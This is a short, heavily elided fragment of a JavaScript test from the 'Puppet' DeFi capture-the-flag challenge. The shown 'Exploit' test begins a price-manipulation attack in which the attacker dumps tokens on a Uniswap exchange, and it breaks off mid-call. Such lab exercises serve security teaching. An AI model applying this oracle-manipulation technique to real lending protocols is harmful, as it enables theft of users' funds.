...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        // sub(1) for balance of attacker greater than lending pool
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
            1,
